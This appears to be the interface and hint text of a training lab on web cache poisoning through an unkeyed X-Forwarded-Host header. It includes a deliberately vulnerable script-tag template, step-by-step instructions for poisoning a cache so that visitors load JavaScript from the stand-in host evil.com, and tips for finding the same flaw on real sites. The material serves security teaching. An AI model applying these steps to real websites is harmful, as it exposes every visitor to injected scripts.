NewsWire Admin

Cache Poisoning Research Lab

Cache Poisoning via Unkeyed Header

Observe how the X-Forwarded-Host header is used in the response but NOT in the cache key.

Normal Visit

Load the NewsWire homepage as a regular user. The cached version will be served to all subsequent visitors.

// Request log

🎯 Poison the Cache

Send a request with a custom X-Forwarded-Host header pointing to evil.com. If the header is unkeyed, your payload gets cached and served to all users.

Header sent: X-Forwarded-Host: evil.com
// Poison attempt log

Verify Poisoning

Now fetch the homepage as a normal victim would (no custom headers). If the cache is poisoned, they get the attacker's script src.

// Victim request log

📦 Cache

Empty

ℹ️ Cache Behavior

• Cache key: URL path only

• X-Forwarded-Host is not part of the key

• The origin uses X-Forwarded-Host to build the analytics script URL

• TTL: 60 seconds (for testing)

🔎 Response Source

The response template contains:

<script src="//${xfh}/cache-poison/analytics.js"></script>

xfh = X-Forwarded-Host || Host

Hint: Cache Poisoning via X-Forwarded-Host

The server uses X-Forwarded-Host to build the analytics script's URL. But the cache key doesn't include this header. So any value you inject gets baked into the cached response, served to every subsequent visitor. Based on PortSwigger's practical cache poisoning research.
1
Observe the normal response›
Click "Load Homepage" first (without poisoning). The response has X-Cache: MISS, cached and a script tag like <script src="//localhost:3000/...>. Then flush the cache to start clean.
2
Find the reflection›
The server uses X-Forwarded-Host (or falls back to Host) as the hostname for the script tag. Send a request with X-Forwarded-Host: evil.com and the response will include src="//evil.com/...".
3
Poison the cache›
After the flush, send ONE request with X-Forwarded-Host: evil.com. The cache sees this as a MISS (no entry for /cache-poison/home) and stores your malicious response. The cache key is only the URL path.
4
Verify and exfil›
Click "Fetch as Victim" — a clean request without your XFH header. The cache serves the poisoned response. Every visitor now loads analytics from evil.com. Host your JS there → mass XSS.

1. Click "Flush" on the cache panel (start clean).

2. In the poison section, X-Forwarded-Host is already evil.com. Click "Send Poison Request".

3. Cache panel now shows /cache-poison/home with script host: evil.com.

4. Click "Fetch as Victim (clean request)". Victim sees poisoned response.

Finding in the wild: search JS bundles and HTML templates for headers like x-forwarded-host, x-forwarded-scheme, x-original-url, x-host, forwarded. Send them with different values and look for reflection into response body. If response is cacheable AND the header isn't in the cache key, you can poison.
